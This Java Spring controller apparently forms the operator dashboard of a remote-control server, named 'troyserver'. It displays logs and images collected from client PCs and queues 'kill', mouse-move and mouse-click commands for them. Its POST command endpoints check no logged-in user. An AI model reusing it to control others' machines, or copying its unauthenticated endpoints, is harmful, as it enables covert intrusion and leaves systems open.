package ch.lebois.troyserver.controller;

import ch.lebois.troyserver.data.entity.Client;
import ch.lebois.troyserver.data.entity.Message;
import ch.lebois.troyserver.data.repository.ClientFieldRepository;
import ch.lebois.troyserver.data.repository.ClientRepository;
import ch.lebois.troyserver.data.repository.ImageRepository;
import ch.lebois.troyserver.data.repository.MessageRepository;
import ch.lebois.troyserver.service.ClientFieldService;
import ch.lebois.troyserver.service.CookieService;
import ch.lebois.troyserver.service.ModelService;
import javax.servlet.http.HttpServletRequest;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;

/**
 * Project: Hermann
 **/


@Controller
@RequestMapping(value = {"dashboard/"})
public class DashboardController {

    private ClientRepository clientRepository;
    private MessageRepository messageRepository;
    private ImageRepository imageRepository;
    private ClientFieldRepository clientFieldRepository;

    private CookieService cookieService;
    private ModelService modelService;
    private ClientFieldService clientFieldService;

    public DashboardController(ClientRepository clientRepository, MessageRepository messageRepository,
                               ImageRepository imageRepository, ClientFieldRepository clientFieldRepository,
                               CookieService cookieService, ModelService modelService,
                               ClientFieldService clientFieldService) {
        this.clientRepository = clientRepository;
        this.messageRepository = messageRepository;
        this.imageRepository = imageRepository;
        this.clientFieldRepository = clientFieldRepository;
        this.cookieService = cookieService;
        this.modelService = modelService;
        this.clientFieldService = clientFieldService;
    }

    @RequestMapping(value = {"{client}"}, method = RequestMethod.GET)
    public String getClientControlPanel(@PathVariable(value = "client") String clientParam, Model model,
                                        HttpServletRequest request) {
        try {
            Client client = clientRepository.findOne(clientParam);
            if (client == null) {
                return "redirect:/dashboard";
            }
            model.addAttribute("client", modelService.getClientModel(client));
            model.addAttribute("logs", getLogs(clientParam));
            model.addAttribute("images", imageRepository.findImagesByPcNameFkOrderByNameDesc(clientParam));
            model.addAttribute("user", cookieService.getCurrentUser(request));
            return "dashboard";
        } catch (NullPointerException e) {
            return "redirect:/login";
        }
    }

    private String getLogs(String clientName) {
        String logs = "";
        Iterable<Message> logList = messageRepository.findAll();
        for (Message m : logList) {
            if (m.getPcNameFk().equals(clientName)) {
                logs = logs + m.getText() + "\n";
            }
        }
        return logs;
    }

    @RequestMapping(value = {"{client}"}, method = RequestMethod.POST)
    public String clearClientLogs(@PathVariable(value = "client") String clientParam) {
        Iterable<Message> logList = messageRepository.findAll();
        for (Message m : logList) {
            if (m.getPcNameFk().equals(clientParam)) {
                messageRepository.delete(m);
            }
        }
        return "redirect:/dashboard/" + clientParam;
    }

    @RequestMapping(value = {"{client}/edit"}, method = RequestMethod.POST)
    public String saveSettings(@PathVariable(value = "client") String clientParam,
                               @RequestParam(name = "nickname") String nickname,
                               @RequestParam(name = "refresh") String refresh,
                               @RequestParam(name = "kill") String kill,
                               @RequestParam(name = "mousex") String mousex,
                               @RequestParam(name = "mousey") String mousey) {
        Client client = clientRepository.findOne(clientParam);
        clientFieldService.setFieldValue(client, "nickname", nickname);

        if (!refresh.equals(clientFieldRepository.findClientFieldByClientAndField(client.getPcName(), "refreshtime").getValue())) {
            clientFieldService.setFieldValue(client, "refreshtime", refresh);
            clientFieldService.setFieldValue(client, "command", "refresh " + refresh);
        }
        if (kill.equals("kill")) {
            clientFieldService.setFieldValue(client, "command", "kill");
        }
        if (!mousex.equals("") && !mousey.equals("")) {
            clientFieldService.setFieldValue(client, "command", "mousemove " + mousex + " " + mousey);
        }
        clientRepository.save(client);

        return "redirect:/dashboard/" + clientParam;
    }

    @RequestMapping(value = {"{client}/click"}, method = RequestMethod.POST)
    public String saveSettings(@PathVariable(value = "client") String clientParam) {
        Client client = clientRepository.findOne(clientParam);
        clientFieldService.setFieldValue(client, "command", "mouseclick");
        clientRepository.save(client);
        return "redirect:/dashboard/" + clientParam;
    }

}
